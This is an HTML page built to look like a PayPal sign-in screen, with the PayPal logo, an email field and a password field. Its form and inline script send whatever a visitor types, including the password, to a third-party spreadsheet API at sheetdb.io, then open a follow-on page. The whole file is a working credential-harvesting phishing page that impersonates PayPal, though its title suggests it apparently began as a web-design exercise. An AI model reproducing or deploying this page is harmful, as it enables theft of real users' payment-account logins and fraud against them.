<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="paypal.css" />
    <title>Web Design Mastery | Paypal Signup Page</title>
  </head>
  <body>
    <div class="container">
      <div class="content">
        <img src="assets/paypal.png" alt="paypal" class="logo" />
        <form action="https://sheetdb.io/api/v1/5d7frvc9k5n8t" method="post" id="sheetdb-form">
           <input
            type="text"
            class="input"
            placeholder="Email or mobile number" name="data[Email or mobile number]"
            />
            <input
            type="text"
            class="input"
            placeholder="Password" name="data[Password]"
            />
          <button class="next__btn" type="submit">Next</button>
        </form>
        <div class="divider"><span></span></div>
      </div>
      <div class="footer">
        <div class="country">
          <img src="assets/flag.png" alt="flag" class="flag" />
          <i class="ri-arrow-down-s-line"></i>
        </div>
        <div class="language">
          <span>English</span>
          <span>Français</span>
          <span>Español</span>
          <span>中国人</span>
        </div>
      </div>
    </div>
    <script>
      var form = document.getElementById('sheetdb-form');
   form.addEventListener("submit", e => {
     e.preventDefault();
     fetch(form.action, {
         method : "POST",
         body: new FormData(document.getElementById("sheetdb-form")),
     }).then(
         response => response.json()
     ).then((html) => {
       // you can put any JS code here
       window.open('page3.html', '_blank');

     });
   });
</script>
  </body>
</html>
